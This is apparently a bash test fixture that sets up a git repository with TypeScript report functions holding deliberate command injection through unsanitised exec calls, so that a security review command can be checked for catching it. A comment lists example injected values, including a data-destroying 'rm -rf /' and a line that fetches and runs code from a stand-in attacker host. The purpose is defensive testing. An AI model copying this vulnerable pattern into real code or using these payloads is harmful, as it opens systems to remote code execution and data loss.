#!/usr/bin/env bash
# Plants a command injection vulnerability in a feature branch.
# The /cass:security standalone command must catch it without needing --security on review.

set -euo pipefail

git init
git config user.name "Test User"
git config user.email "test@example.com"

mkdir -p src
cat > src/runner.ts <<'EOF'
import { exec } from "child_process";

export function runReport(reportName: string): void {
  // BUG: reportName is user-controlled input passed directly into a shell command.
  // An attacker can pass "; rm -rf /" or "$(curl evil.com/payload | sh)" as reportName.
  exec(`generate-report ${reportName}`, (err, stdout) => {
    if (err) console.error(err);
    console.log(stdout);
  });
}
EOF

git add .
git commit -m "initial: add runner with no command injection"

git checkout -b feat/report-runner

cat > src/runner.ts <<'EOF'
import { exec } from "child_process";

export function runReport(reportName: string): void {
  // BUG: reportName is user-controlled input — command injection via shell metacharacters
  exec(`generate-report ${reportName}`, (err, stdout) => {
    if (err) console.error(err);
    console.log(stdout);
  });
}

export function listReports(directory: string): void {
  // BUG: directory is also user-controlled — same injection risk
  exec(`ls -la ${directory}/reports`, (err, stdout) => {
    if (err) console.error(err);
    console.log(stdout);
  });
}
EOF

git add .
git commit -m "feat: add report runner and list utility"

echo "Setup complete. Branch: feat/report-runner with command injection in both functions."
